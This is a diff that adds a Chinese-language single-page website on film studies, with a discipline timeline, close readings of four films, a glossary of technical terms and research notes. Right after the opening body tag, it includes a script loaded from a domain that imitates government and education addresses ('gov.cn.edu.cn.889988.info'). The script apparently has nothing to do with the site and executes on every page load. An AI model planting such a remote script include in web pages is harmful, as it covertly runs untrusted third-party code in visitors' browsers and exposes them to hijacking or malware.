@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="影视学（yingshixue-zh）聚焦影视艺术本体研究，系统梳理视听语言、叙事结构、类型片脉络与影像批评方法，提供可复用的作品细读框架与学科入门路径。">
+<meta name="keywords" content="影视学, 影视艺术研究, 视听语言分析, 电影叙事学, 类型片研究, 影像批评, 影视理论入门, yingshixue-zh">
+<meta name="author" content="影视学">
+<meta name="theme-color" content="#0f1420">
+<title>影视学 | 视听语言与影像叙事的系统研究</title>
+<style>
+:root{
+  --ink:#e8eaf0;
+  --ink-dim:#a4adbd;
+  --muted:#6f7a8c;
+  --paper:#0f1420;
+  --paper-2:#161d2c;
+  --line:#262f42;
+  --accent:#ff7a45;
+  --accent-2:#4dd4ac;
+  --serif:"Source Han Serif SC","Noto Serif CJK SC","Songti SC",Georgia,serif;
+  --sans:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:var(--sans);
+  line-height:1.85;
+  font-size:16px;
+  overflow-x:hidden;
+}
+::selection{background:var(--accent);color:#fff}
+a{color:var(--accent-2);text-decoration:none}
+a:hover{text-decoration:underline;text-underline-offset:3px}
+.wrap{max-width:1180px;margin:0 auto;padding:0 22px}
+
+/* ── 顶部导航 ── */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(15,20,32,.86);
+  backdrop-filter:blur(10px);
+  border-bottom:1px solid var(--line);
+}
+.topbar .wrap{display:flex;align-items:center;gap:18px;height:60px}
+.brand{font-family:var(--serif);font-size:22px;letter-spacing:2px;color:var(--ink);white-space:nowrap}
+.brand em{font-style:normal;color:var(--accent)}
+.nav{display:flex;gap:4px;flex-wrap:wrap;margin-left:auto}
+.nav a{
+  color:var(--ink-dim);font-size:14px;padding:7px 12px;border-radius:6px;
+  transition:.2s;
+}
+.nav a:hover{background:var(--paper-2);color:var(--ink);text-decoration:none}
+.hint{display:none;color:var(--muted);font-size:12px;margin-left:auto}
+
+/* ── 栏目通用 ── */
+section{padding:74px 0;border-top:1px solid var(--line)}
+.sec-head{margin-bottom:38px}
+.sec-no{
+  font-family:var(--serif);font-size:13px;letter-spacing:3px;
+  color:var(--accent);text-transform:uppercase;
+}
+h2{
+  font-family:var(--serif);font-size:clamp(26px,4vw,40px);
+  font-weight:600;letter-spacing:1px;margin-top:8px;line-height:1.3;
+}
+.sec-sub{color:var(--ink-dim);margin-top:10px;max-width:640px;font-size:15px}
+
+/* ── 首页 hero ── */
+#home{min-height:min(82vh,640px);display:flex;align-items:center;padding:60px 0;border-top:none;position:relative}
+#home::after{
+  content:"";position:absolute;right:-10%;top:10%;width:520px;height:520px;border-radius:50%;
+  background:radial-gradient(circle,rgba(255,122,69,.14),transparent 65%);z-index:-1;
+}
+.hero-tag{
+  display:inline-block;border:1px solid var(--line);border-radius:999px;
+  padding:5px 14px;font-size:12px;letter-spacing:1px;color:var(--ink-dim);margin-bottom:22px;
+}
+h1{
+  font-family:var(--serif);font-size:clamp(38px,7vw,74px);line-height:1.12;
+  font-weight:700;letter-spacing:3px;
+}
+h1 span{color:var(--accent)}
+.lede{margin-top:22px;max-width:600px;color:var(--ink-dim);font-size:16px}
+.hero-meta{margin-top:34px;display:flex;flex-wrap:wrap;gap:10px}
+.hero-meta a{
+  border:1px solid var(--line);border-radius:6px;padding:9px 16px;font-size:13.5px;
+  color:var(--ink);background:var(--paper-2);transition:.2s;
+}
+.hero-meta a:hover{border-color:var(--accent);text-decoration:none;transform:translateY(-2px)}
+.site-url{
+  margin-top:40px;padding:14px 18px;border-left:3px solid var(--accent-2);
+  background:var(--paper-2);font-size:13px;color:var(--ink-dim);word-break:break-all;
+}
+.site-url b{color:var(--ink);font-weight:600}
+
+/* ── 学科体系：时间轴 ── */
+.track{position:relative;padding-left:26px}
+.track::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:var(--line)}
+.node{position:relative;padding:0 0 30px 22px}
+.node::before{
+  content:"";position:absolute;left:-24px;top:8px;width:12px;height:12px;border-radius:50%;
+  background:var(--paper);border:2px solid var(--accent);
+}
+.node h3{font-family:var(--serif);font-size:19px;font-weight:600;margin-bottom:4px}
+.node time{font-size:12px;letter-spacing:1px;color:var(--accent-2)}
+.node p{color:var(--ink-dim);font-size:14.5px;margin-top:6px}
+
+/* ── 作品解构：卡片 ── */
+.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px}
+.card{background:var(--paper-2);border:1px solid var(--line);border-radius:10px;overflow:hidden;transition:.25s;display:flex;flex-direction:column}
+.card:hover{transform:translateY(-4px);border-color:#3a4559;box-shadow:0 14px 34px rgba(0,0,0,.45)}
+.thumb{height:150px;position:relative;overflow:hidden}
+.thumb i{position:absolute;inset:0;display:block}
+.c1{background:linear-gradient(135deg,#2b2340,#5b3a5e)}
+.c2{background:linear-gradient(135deg,#123b3a,#1f6b5c)}
+.c3{background:linear-gradient(135deg,#3d2a1f,#8a5a2b)}
+.c4{background:linear-gradient(135deg,#1f2a44,#3d5a8a)}
+.thumb b{
+  position:absolute;left:14px;bottom:12px;font-family:var(--serif);font-size:14px;
+  letter-spacing:1px;color:#fff;text-shadow:0 2px 8px rgba(0,0,0,.6);
+}
+.card-body{padding:16px 18px;flex:1;display:flex;flex-direction:column}
+.card-body h3{font-size:16.5px;font-family:var(--serif);margin-bottom:8px;line-height:1.45}
+.card-body p{font-size:13.5px;color:var(--ink-dim);flex:1}
+.tags{margin-top:12px;display:flex;flex-wrap:wrap;gap:6px}
+.tags span{font-size:11.5px;color:var(--accent-2);border:1px solid #2c4a42;border-radius:4px;padding:2px 8px}
+
+/* ── 光影技术：术语表 ── */
+.glossary{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px}
+.term{border:1px solid var(--line);border-radius:8px;padding:16px 18px;background:linear-gradient(180deg,var(--paper-2),transparent)}
+.term dfn{font-family:var(--serif);font-size:17px;font-weight:600;font-style:normal;display:block;margin-bottom:6px}
+.term dfn small{font-size:12px;color:var(--accent);font-weight:400;margin-left:8px}
+.term p{font-size:13.5px;color:var(--ink-dim)}
+
+/* ── 学术视界：文章列表 ── */
+.notes{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.note{background:var(--paper-2);padding:18px 20px;display:flex;gap:18px;align-items:flex-start}
+.note .idx{font-family:var(--serif);font-size:22px;color:var(--muted);line-height:1;flex:none;width:34px}
+.note h3{font-size:16px;font-family:var(--serif);margin-bottom:5px}
+.note p{font-size:13.5px;color:var(--ink-dim)}
+.note .date{font-size:11.5px;color:var(--accent-2);margin-top:8px;letter-spacing:.5px}
+
+/* ── 页脚 ── */
+footer{border-top:1px solid var(--line);padding:44px 0 30px;margin-top:40px}
+.foot-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:26px;margin-bottom:32px}
+.foot-col h4{font-family:var(--serif);font-size:15px;margin-bottom:10px;color:var(--ink)}
+.foot-col ul{list-style:none}
+.foot-col li{font-size:13.5px;color:var(--ink-dim);padding:3px 0}
+.copy{font-size:12.5px;color:var(--muted);border-top:1px solid var(--line);padding-top:20px}
+
+/* ── 响应式 ── */
+@media (max-width:820px){
+  .nav{display:none}
+  .hint{display:block}
+  section{padding:54px 0}
+  .note{flex-direction:column;gap:8px}
+  .note .idx{width:auto}
+  #home{min-height:auto;padding:44px 0}
+}
+@media print{
+  body{background:#fff;color:#000}
+  .topbar{display:none}
+  section{page-break-inside:avoid}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="brand" href="#home">影视学<em>·</em></a>
+    <nav class="nav" aria-label="主导航">
+      <a href="#home">卷首</a>
+      <a href="#system">学科体系</a>
+      <a href="#decode">作品解构</a>
+      <a href="#craft">光影技术</a>
+      <a href="#journal">学术视界</a>
+    </nav>
+    <span class="hint">← 卷首 · 学科 · 解构 · 技术 · 视界 →</span>
+  </div>
+</header>
+
+<main>
+
+  <!-- 卷首 -->
+  <section id="home">
+    <div class="wrap">
+      <span class="hero-tag">YINGSHIXUE · 影视艺术研究志</span>
+      <h1>把电影<span>拆开</span><br>再重新看懂</h1>
+      <p class="lede">影视学不是影评的汇总，而是一套关于<strong>影像如何组织意义</strong>的方法。这里从镜头、声音、剪辑与叙事四端入手，把感性的"好看"还原成可分析、可复述、可讨论的知识结构。</p>
+      <div class="hero-meta">
+        <a href="#system">学科脉络</a>
+        <a href="#decode">细读样本</a>
+        <a href="#craft">术语手册</a>
+        <a href="#journal">研究笔记</a>
+      </div>
+      <p class="site-url"><b>官方网站：</b>https://yingshixue-zh.github.io　|　本站为单页结构，各栏目以锚点定位。</p>
+    </div>
+  </section>
+
+  <!-- 学科体系 -->
+  <section id="system">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-no">01 / Discipline</div>
+        <h2>学科体系：影视学在学什么</h2>
+        <p class="sec-sub">影视学（Film and Television Studies）以视听媒介为对象，横跨艺术学、传播学、叙事学与心理学。它的核心问题始终是：影像凭什么让人相信、并为之动情。</p>
+      </div>
+      <div class="track">
+        <article class="node">
+          <time>1895 — 1927</time>
+          <h3>无声影像与电影语言的诞生</h3>
+          <p>从卢米埃尔的记录到格里菲斯的剪辑，影视学追溯"镜头可以说话"的起点：景别、特写、平行蒙太奇如何替代了舞台式的完整场面。</p>
+        </article>
+        <article class="node">
+          <time>1927 — 1960</time>
+          <h3>声音入场与经典叙事成型</h3>
+          <p>对白、声效与音乐的加入改变了剪辑节奏，好莱坞经典叙事体系确立。这一时期的研究重点转向类型惯例与"看不见的剪辑"。</p>
+        </article>
+        <article class="node">
+          <time>1960 — 1990</time>
+          <h3>作者论、符号学与意识形态批评</h3>
+          <p>影视学获得理论深度：作者身份、镜头中的权力关系、性别与阶级的再现方式，成为解读影像的三条主要路径。</p>
+        </article>
+        <article class="node">
+          <time>1990 — 至今</time>
+          <h3>数字媒介与跨屏叙事</h3>
+          <p>CGI、流媒体与短视频重构了生产与观看方式，研究视野随之扩展至算法推荐、互动叙事与竖屏语法。</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 作品解构 -->
+  <section id="decode">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-no">02 / Close Reading</div>
+        <h2>作品解构：四部样本的细读框架</h2>
+        <p class="sec-sub">解读一部作品不需要形容词堆砌。锁定<strong>开场三分钟</strong>的信息量、<strong>空间关系</strong>的调度、<strong>声音设计</strong>的情绪引导，结论自然浮现。</p>
+      </div>
+      <div class="grid">
+        <article class="card">
+          <div class="thumb"><i class="c1"></i><b>《肖申克的救赎》</b></div>
+          <div class="card-body">
+            <h3>希望叙事的空间语法</h3>
+            <p>监狱的高墙、俯拍与封闭构图构成压抑基调，海报后的洞口则是全片唯一的"画外空间"。分析重点：画外空间如何承担主题表达。</p>
+            <div class="tags"><span>空间调度</span><span>画外空间</span><span>主题隐喻</span></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i class="c2"></i><b>《盗梦空间》</b></div>
+          <div class="card-body">
+            <h3>多层梦境的剪辑时钟</h3>
+            <p>四层时空共享一条时间轴，交叉剪辑让观众自行完成同步。分析重点：剪辑如何把抽象的时间比例转换成可感知的紧张感。</p>
+            <div class="tags"><span>交叉剪辑</span><span>节奏控制</span><span>叙事结构</span></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i class="c3"></i><b>《寄生虫》</b></div>
+          <div class="card-body">
+            <h3>阶梯、气味与阶级视线</h3>
+            <p>上下台阶的反复出现构成全片的空间母题，低角度与高角度的切换对应人物位置的升降。分析重点：美术设计如何参与叙事。</p>
+            <div class="tags"><span>场面调度</span><span>视觉母题</span><span>社会隐喻</span></div>
+          </div>
+        </article>
+        <article class="card">
+          <div class="thumb"><i class="c4"></i><b>《星际穿越》</b></div>
+          <div class="card-body">
+            <h3>寂静中的声音设计</h3>
+            <p>太空段落抽空环境音，仅靠呼吸声与弦乐建立压迫；对接段落的音量骤变制造失重感。分析重点：声音缺席本身就是修辞。</p>
+            <div class="tags"><span>声音设计</span><span>静默修辞</span><span>沉浸感</span></div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 光影技术 -->
+  <section id="craft">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-no">03 / Vocabulary</div>
+        <h2>光影技术：常用术语手册</h2>
+        <p class="sec-sub">掌握这组基础概念，就等于拿到了进入影像讨论的通用语言。每条术语都可以直接用于拉片笔记。</p>
+      </div>
+      <div class="glossary">
+        <div class="term">
+          <dfn>景别 <small>Shot Size</small></dfn>
+          <p>被摄主体在画框中占据的比例，从远景到特写决定观众与角色的心理距离，是导演控制注意力的第一手段。</p>
+        </div>
+        <div class="term">
+          <dfn>蒙太奇 <small>Montage</small></dfn>
+          <p>镜头并列产生的意义大于单个镜头之和。库里肖夫实验证明：同一张面孔配上不同画面，观众会读出不同情绪。</p>
+        </div>
+        <div class="term">
+          <dfn>轴线原则 <small>Axis Rule</small></dfn>
+          <p>对话或运动场景中保持机位在假想轴线一侧，越轴会造成空间错乱感；有意越轴则常用于表现心理失衡。</p>
+        </div>
+        <div class="term">
+          <dfn>深焦摄影 <small>Deep Focus</small></dfn>
+          <p>前景、中景、后景同时清晰，迫使观众主动选择观看对象，代表作中常见此类"民主化"的构图方式。</p>
+        </div>
+        <div class="term">
+          <dfn>匹配剪辑 <small>Match Cut</small></dfn>
+          <p>利用前后镜头在形状、运动或构图上的相似完成转场，既能压缩时间，也能建立两个时空的隐喻关联。</p>
+        </div>
+        <div class="term">
+          <dfn>非剧情声 <small>Non-diegetic</small></dfn>
+          <p>画面中人物听不到的声音，如配乐与旁白。它直接向观众发言，是引导价值判断最隐蔽也最有效的工具。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 学术视界 -->
+  <section id="journal">
+    <div class="wrap">
+      <div class="sec-head">
+        <div class="sec-no">04 / Journal</div>
+        <h2>学术视界：研究笔记</h2>
+        <p class="sec-sub">不定期更新的长文，偏向方法论与理论脉络梳理，适合写论文、做汇报或单纯想把一部片子"说透"的读者。</p>
+      </div>
+      <div class="notes">
+        <article class="note">
+          <span class="idx">01</span>
+          <div>
+            <h3>为什么"看不懂"常常是被设计的</h3>
+            <p>从《2001太空漫游》到当代艺术电影，信息缺失不是缺陷而是结构。本文梳理三种常见的"留白机制"及其观看策略。</p>
+            <div class="date">更新于 2026年10月</div>
+          </div>
+        </article>
+        <article class="note">
+          <span class="idx">02</span>
+          <div>
+            <h3>短视频改变了电影的语法吗</h3>
+            <p>竖屏、快切、字幕压屏正在反向侵入长片开场。本文对比近五年商业片的片头设计，观察语法迁移的具体路径。</p>
+            <div class="date">更新于 2026年9月</div>
+          </div>
+        </article>
+        <article class="note">
+          <span class="idx">03</span>
+          <div>
+            <h3>类型片的契约精神</h3>
+            <p>类型不是套路，而是创作者与观众之间的一份默契。本文以悬疑与喜剧为例，拆解这份契约在开场十分钟里如何被签下。</p>
+            <div class="date">更新于 2026年8月</div>
+          </div>
+        </article>
+        <article class="note">
+          <span class="idx">04</span>
+          <div>
+            <h3>拉片笔记怎么写才有用</h3>
+            <p>时间码、镜头参数、声音变化三段式记录法，附一份可直接套用的模板，让观后感升级为可复用的分析材料。</p>
+            <div class="date">更新于 2026年7月</div>
+          </div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="foot-grid">
+      <div class="foot-col">
+        <h4>影视学</h4>
+        <ul>
+          <li>视听语言研究</li>
+          <li>影像叙事分析</li>
+          <li>作品细读方法</li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>栏目导航</h4>
+        <ul>
+          <li><a href="#home">卷首</a></li>
+          <li><a href="#system">学科体系</a></li>
+          <li><a href="#decode">作品解构</a></li>
+          <li><a href="#craft">光影技术</a></li>
+          <li><a href="#journal">学术视界</a></li>
+        </ul>
+      </div>
+      <div class="foot-col">
+        <h4>适用场景</h4>
+        <ul>
+          <li>影视专业入门</li>
+          <li>论文与课程作业</li>
+          <li>拉片与影评写作</li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      网站名称：影视学　|　官方网站：https://yingshixue-zh.github.io　|　本站为单页结构，内页链接以 # 锚点实现，未配置 robots.txt 与 sitemap.xml。
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
